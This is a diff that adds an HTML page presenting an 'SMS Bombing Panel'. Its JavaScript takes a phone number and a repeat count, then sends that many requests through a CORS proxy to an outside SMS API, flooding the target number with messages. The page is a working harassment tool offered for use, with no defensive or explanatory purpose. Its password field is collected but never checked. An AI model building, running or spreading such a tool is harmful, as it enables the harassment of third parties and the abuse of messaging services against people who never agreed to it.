@@ -1,0 +1,83 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Alin Chakma</title>
+  <style>
+    body {
+      background-color: black;
+      color: lime;
+      font-family: monospace;
+      text-align: center;
+    }
+    .panel {
+      border: 2px solid lime;
+      padding: 20px;
+      display: inline-block;
+      margin-top: 50px;
+      border-radius: 10px;
+      box-shadow: 0 0 15px lime;
+    }
+    input, button {
+      padding: 10px;
+      margin: 5px;
+      border: none;
+      outline: none;
+      font-size: 16px;
+      border-radius: 5px;
+    }
+    input {
+      width: 200px;
+    }
+    button {
+      background-color: lime;
+      color: black;
+      cursor: pointer;
+    }
+    .error {
+      color: red;
+    }
+    .success {
+      color: lime;
+    }
+  </style>
+</head>
+<body>
+  <h1>Alin Chakma</h1>
+  <div class="panel">
+    <h2>💥 Bombing Panel</h2>
+    <input type="text" id="number" placeholder="Enter Number"><br>
+    <input type="number" id="count" placeholder="Times"><br>
+    <input type="password" id="password" placeholder="Password"><br>
+    <button onclick="startBombing()">🚀 Start Bombing</button>
+    <div id="status"></div>
+  </div>
+
+  <script>
+    function startBombing() {
+      const number = document.getElementById('number').value.trim();
+      const count = parseInt(document.getElementById('count').value.trim());
+      const password = document.getElementById('password').value.trim();
+      const statusDiv = document.getElementById('status');
+      statusDiv.innerHTML = "";
+
+      if (!number || !count || !password) {
+        statusDiv.innerHTML = "<p class='error'>⚠️ Please fill all fields</p>";
+        return;
+      }
+
+      for (let i = 1; i <= count; i++) {
+        fetch(`https://corsproxy.io/?http://dz24pro.site/api/sms.php?number=${encodeURIComponent(number)}`)
+          .then(res => res.text())
+          .then(data => {
+            statusDiv.innerHTML += `<p class='success'>✅ Sent ${i}: ${data}</p>`;
+          })
+          .catch(err => {
+            statusDiv.innerHTML += `<p class='error'>❌ Error on ${i}: ${err}</p>`;
+          });
+      }
+    }
+  </script>
+</body>
+</html>
